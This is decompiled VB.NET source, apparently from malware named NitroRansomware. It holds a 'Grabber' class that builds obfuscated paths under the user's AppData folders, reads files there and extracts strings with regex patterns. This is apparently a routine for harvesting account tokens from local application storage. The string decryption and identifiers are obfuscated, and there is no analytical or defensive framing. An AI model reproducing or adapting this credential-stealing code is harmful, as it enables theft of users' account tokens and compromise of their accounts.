Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Text.RegularExpressions
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x02000004 RID: 4
	Friend Class Grabber
		' Token: 0x06000015 RID: 21 RVA: 0x000041E4 File Offset: 0x000023E4
		Private Shared Sub Scan()
			Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			Dim folderPath2 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			Grabber.target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3302))
			Grabber.target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3322))
			Grabber.target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3354))
			Grabber.target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3380))
			Grabber.target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3442))
			Grabber.target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3510))
			Grabber.target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3606))
		End Sub

		' Token: 0x06000016 RID: 22 RVA: 0x000042B8 File Offset: 0x000024B8
		Public Shared Function Grab() As List(Of String)
			Grabber.Scan()
			Dim list As List(Of String) = New List(Of String)()
			For Each text As String In Grabber.target
				If Directory.Exists(text) Then
					Dim text2 As String = text + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3688)
					Dim directoryInfo As DirectoryInfo = New DirectoryInfo(text2)
					For Each fileInfo As FileInfo In directoryInfo.GetFiles(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3736))
						Dim text3 As String = fileInfo.OpenText().ReadToEnd()
						For Each obj As Object In Regex.Matches(text3, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3750))
							Dim match As Match = CType(obj, Match)
							list.Add(match.Value)
						Next
						For Each obj2 As Object In Regex.Matches(text3, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3814))
							Dim match2 As Match = CType(obj2, Match)
							list.Add(match2.Value)
						Next
					Next
				End If
			Next
			Return list
		End Function

		' Token: 0x06000017 RID: 23 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x06000018 RID: 24 RVA: 0x000022B7 File Offset: 0x000004B7
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Grabber.target = New List(Of String)()
		End Sub

		' Token: 0x04000021 RID: 33
		Private Shared target As List(Of String)
	End Class
End Namespace
